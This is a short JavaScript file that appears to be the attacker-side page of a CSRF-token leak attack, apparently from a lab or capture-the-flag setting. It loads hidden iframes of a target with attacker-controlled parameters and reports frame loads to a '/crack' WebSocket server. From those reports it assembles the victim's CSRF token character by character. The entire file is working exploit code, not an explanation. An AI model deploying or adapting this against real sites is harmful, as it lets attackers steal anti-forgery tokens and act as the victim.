const TARGET = "https://172.31.217.234:5000"



const sock = new WebSocket(`ws://${window.location.host}/crack`)
sock.onopen = () => {
    sock.send("ready")
}

function loaded(){
    sock.send("page_loaded")
}

sock.onmessage = msg => {
    const [command, data] = msg.data.split('\n',limit=2)
    if(command === "iframe"){
        const new_frame = document.createElement('iframe')
        new_frame.setAttribute("src",`${TARGET}/?location=${data}`)
        new_frame.setAttribute("hidden","true")
        new_frame.setAttribute("onload","loaded()")
        document.getElementById("frame_wrapper").innerHTML = ""
        document.getElementById("frame_wrapper").appendChild(new_frame)
    }else if(command === "char_found"){
        document.getElementById("csrf").textContent += data
    }else if(command === "done"){
        alert(data)
        sock.close()
    }
}